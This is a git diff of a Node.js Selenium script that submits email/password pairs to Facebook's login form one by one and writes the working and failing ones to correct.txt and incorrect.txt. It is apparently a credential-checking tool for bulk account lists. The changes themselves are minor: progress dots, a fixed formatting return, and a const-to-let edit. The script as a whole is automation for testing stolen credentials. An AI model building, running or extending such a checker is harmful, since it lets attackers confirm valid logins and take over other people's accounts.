@@ -22,14 +22,18 @@ async function loginCheckAndRecord(login, correct, incorrect) {
     .build();
 
   try {
-    process.stdout.write(" ... ");
+    process.stdout.write(" .");
     await driver.get("https://www.facebook.com");
     await driver
       .findElement(By.name("email"))
       .sendKeys(login.email, Key.TAB, login.password, Key.RETURN);
+
+    process.stdout.write(".");
     await driver.wait(
       until.stalenessOf(await driver.findElement(By.css("body")))
     );
+
+    process.stdout.write(". ");
     let title = "";
     while (title == "") {
       title = await driver.getTitle();
@@ -52,11 +56,10 @@ async function loginCheckAndRecord(login, correct, incorrect) {
 }
 
 const writeResults = results => {
-
   const write = (result, filename) => {
     //format
     const text = result.map(val => {
-      (" " + val.email + "\t" + val.password)
+      return (val.email + "\t\t" + val.password)
     }).join("\r\n");
     //write
     fs.writeFile(filename, text, (err) => {
@@ -68,12 +71,12 @@ const writeResults = results => {
   write(results[1], "incorrect.txt")
 
   console.log("*".repeat(16))
-  console.log("Done. Exiting the program... ")
+  console.log("Done. Exiting .. ")
 }
 
 async function filterFunc(loginsArr) {
   console.log("Filtering ...")
-  const correct = [], incorrect = []
+  let correct = [], incorrect = []
   for (let i = 0; i < loginsArr.length; i++) {
     const num = i + 1
     process.stdout.write(num.toString())
